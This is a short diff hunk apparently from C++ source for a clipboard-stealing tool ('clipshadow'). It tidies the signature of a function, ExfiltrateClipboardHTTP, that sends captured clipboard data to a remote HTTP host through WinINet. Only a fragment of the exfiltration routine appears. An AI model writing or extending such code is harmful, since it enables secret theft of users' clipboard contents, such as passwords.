@@ -8,7 +8,7 @@
 /// @param path the path/endpoint on the receiving machine (e.g /example.php)
 /// @param port HTTP port (default = 80)
 /// @return true if sent successfully, false otherwise 
-bool ExfiltrateClipboardHTTP(const std::string& data, const std::string& host, const std::string path, int port = 80)
+bool ExfiltrateClipboardHTTP(const std::string& data, const std::string& host, const std::string& path, int port = 80)
 {
     HINTERNET hSession = InternetOpenA("clipshadow", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
     if(!hSession)
